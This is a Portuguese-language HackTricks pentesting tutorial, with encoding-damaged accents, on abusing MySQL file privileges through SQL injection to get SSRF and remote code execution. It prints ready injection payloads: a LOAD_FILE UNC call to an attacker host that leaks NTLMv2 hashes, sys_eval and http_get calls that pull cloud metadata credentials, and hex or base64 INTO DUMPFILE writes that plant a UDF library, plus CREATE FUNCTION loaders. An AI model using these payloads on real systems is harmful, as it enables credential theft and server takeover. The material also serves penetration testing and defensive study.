# MySQL File priv para SSRF/RCE

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### LOAD\_FILE/LOAD DATA/LOAD XML para SSRF

Todo artigo de exfiltra√ß√£o de dados SQL Out of Band usar√° a fun√ß√£o de string `LOAD_FILE()` para fazer uma solicita√ß√£o de rede. A fun√ß√£o em si tem suas pr√≥prias limita√ß√µes com base no sistema operacional em que √© executada e nas configura√ß√µes com as quais o banco de dados foi iniciado.

Por exemplo, se a vari√°vel global `secure_file_priv` n√£o estiver definida, o [valor padr√£o √© definido como `/var/lib/mysql-files/`](https://dev.mysql.com/doc/mysql-installation-excerpt/5.7/en/linux-installation-rpm.html), o que significa que voc√™ s√≥ pode usar fun√ß√µes como `LOAD_FILE('nome_do_arquivo')` ou `LOAD DATA [LOCAL] INFILE 'nome_do_arquivo' INTO TABLE nome_da_tabela` para ler arquivos do diret√≥rio `/var/lib/mysql-files/`. Para poder realizar leituras em arquivos fora deste diret√≥rio, a op√ß√£o `secure_file_priv` deve ser definida como `""`, o que s√≥ pode ser feito atualizando o arquivo de configura√ß√£o do banco de dados ou passando o par√¢metro de inicializa√ß√£o `--secure_file_priv=""` para o servi√ßo de banco de dados.

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/2.png)

No entanto, em circunst√¢ncias em que `secure_file_priv` √© definido como `""`, dever√≠amos ser capazes de ler outros arquivos no sistema, assumindo permiss√µes de leitura de arquivo e `file_priv` definido como `Y` em `mysql.user` para o usu√°rio do banco de dados atual. No entanto, ser capaz de usar essas fun√ß√µes para fazer chamadas de rede √© muito dependente do sistema operacional. Como essas fun√ß√µes s√£o constru√≠das apenas para ler arquivos, as √∫nicas chamadas relevantes para a rede que podem ser feitas s√£o para caminhos UNC em hosts Windows, pois a [API `CreateFileA` do Windows que √© chamada ao acessar um arquivo entende as conven√ß√µes de nomenclatura UNC](https://docs.microsoft.com/en-gb/windows/win32/fileio/naming-a-file).

Portanto, se o banco de dados de destino estiver sendo executado em uma m√°quina Windows, a consulta de inje√ß√£o `x'; SELECT LOAD_FILE('\\\\attackerserver.example.com\\a.txt'); -- //` resultaria no envio da m√°quina Windows de hashes NTLMv2 na tentativa de autenticar com o `\\attackerserver.example.com` controlado pelo atacante.

Esse Server Side Request Forgery, embora √∫til, est√° restrito apenas √† porta TCP 445. Voc√™ n√£o pode controlar o n√∫mero da porta, mas pode ler informa√ß√µes de compartilhamentos configurados com privil√©gios de leitura completos. Al√©m disso, como foi mostrado em pesquisas anteriores, voc√™ pode usar essa capacidade limitada de SSRF para roubar hashes e transmiti-los para obter shells, ent√£o definitivamente √© √∫til.

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/3.png)

### Fun√ß√µes Definidas pelo Usu√°rio para RCE

Outra t√©cnica interessante com bancos de dados MySQL √© a capacidade de usar Fun√ß√µes Definidas pelo Usu√°rio (UDF) presentes em arquivos de biblioteca externos que, se estiverem presentes em locais espec√≠ficos ou no $PATH do sistema, podem ser acessados de dentro do MySQL.

Voc√™ pode usar uma Inje√ß√£o de SQL para **escrever uma biblioteca (`.so` ou `.dll`** dependendo do Linux ou Windows), contendo uma Fun√ß√£o Definida pelo Usu√°rio que pode fazer solicita√ß√µes de rede/HTTP, que podem ser ent√£o invocadas por meio de consultas adicionais.

Isso tem suas pr√≥prias restri√ß√µes. Com base na vers√£o do MySQL, que voc√™ pode identificar com `select @@version`, o diret√≥rio de onde os plugins podem ser carregados √© restrito. O MySQL abaixo de `v5.0.67` permitia que arquivos de biblioteca fossem carregados do caminho do sistema se a vari√°vel `plugin_dir` n√£o estivesse definida. Isso mudou agora e vers√µes mais recentes t√™m a vari√°vel **`plugin_dir`** definida como algo como `/usr/lib/mysql/plugin/`, que geralmente √© de propriedade do root.

Basicamente, **para carregar uma biblioteca personalizada no MySQL e chamar uma fun√ß√£o da biblioteca carregada via Inje√ß√£o de SQL, voc√™ precisaria**:

* ter a **capacidade de gravar no local** especificado em **`@@plugin_dir`** via Inje√ß√£o de SQL
* **`file_priv`** definido como **`Y`** em `mysql.user` para o usu√°rio do banco de dados atual
* **`secure_file_priv`** definido como **`""`** para que voc√™ possa ler os bytes brutos da biblioteca de uma localiza√ß√£o arbitr√°ria, como a rede ou um diret√≥rio de uploads de arquivos em um aplicativo da web.

Supondo que as condi√ß√µes acima sejam atendidas, voc√™ pode usar a **abordagem cl√°ssica de transferir a** [**biblioteca UDF popular do MySQL `lib_mysqludf_sys`**](https://github.com/mysqludf/lib\_mysqludf\_sys) **para o servidor de banco de dados**. Voc√™ ent√£o seria capaz de fazer solicita√ß√µes de comandos do sistema operacional como `cURL` ou `powershell wget` para realizar SSRF usando a sintaxe

`x'; SELECT sys_eval('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

Existem muitas outras fun√ß√µes declaradas nesta biblioteca, uma an√°lise das quais pode ser vista [aqui](https://osandamalith.com/2018/02/11/mysql-udf-exploitation/). Se voc√™ √© pregui√ßoso como eu, pode pegar uma c√≥pia desta biblioteca UDF, para o sistema operacional de destino, de uma instala√ß√£o do metasploit no diret√≥rio `/usr/share/metasploit-framework/data/exploits/mysql/` e come√ßar a usar.

Alternativamente, bibliotecas UDF foram criadas especificamente para fornecer ao banco de dados a capacidade de fazer solicita√ß√µes HTTP. Voc√™ pode usar [MySQL User-defined function (UDF) for HTTP GET/POST](https://github.com/y-ken/mysql-udf-http) para fazer com que o banco de dados fa√ßa solicita√ß√µes HTTP, usando a seguinte sintaxe

`x'; SELECT http_get('http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

Voc√™ tamb√©m pode [criar sua pr√≥pria UDF e us√°-la para p√≥s-explora√ß√£o tamb√©m.](https://pure.security/simple-mysql-backdoor-using-user-defined-functions/)
Em qualquer caso, voc√™ precisa transferir a biblioteca para o servidor de banco de dados. Voc√™ pode fazer isso de v√°rias maneiras:

1. Use a fun√ß√£o de string `hex()` do MySQL ou algo como `xxd -p filename.so | tr -d '\n'` para converter o conte√∫do da biblioteca para formato hexadecimal e, em seguida, despeje-o no diret√≥rio `@@plugin_dir` usando `x'; SELECT unhex(0x1234abcd12abcdef1223.....) into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`
2. Alternativamente, converta o conte√∫do de `filename.so` para base64 e use `x';select from_base64("AAAABB....") into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`

Se o `@@plugin_dir` n√£o for grav√°vel, voc√™ est√° sem sorte se a vers√£o for superior a `v5.0.67`. Caso contr√°rio, escreva em um local diferente que esteja no caminho e carregue a biblioteca UDF de l√° usando:

* para a biblioteca `lib_mysqludf_sys` - `x';create function sys_eval returns string soname 'lib_mysqludf_sys.so'; -- //`
* para a biblioteca `mysql-udf-http` - `x';create function http_get returns string soname 'mysql-udf-http.so'; -- //`

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/4.png)

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/5.png)

Para automatizar isso, voc√™ pode usar o SQLMap, que suporta [o uso de UDF personalizada por meio da op√ß√£o `--udf-inject`](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

Para Inje√ß√µes de SQL Cego, voc√™ pode redirecionar a sa√≠da das fun√ß√µes UDF para uma tabela tempor√°ria e, em seguida, ler os dados de l√° ou usar [uma solicita√ß√£o DNS embutida em um comando curl `sys_eval` ou `sys_exec`](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration).

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
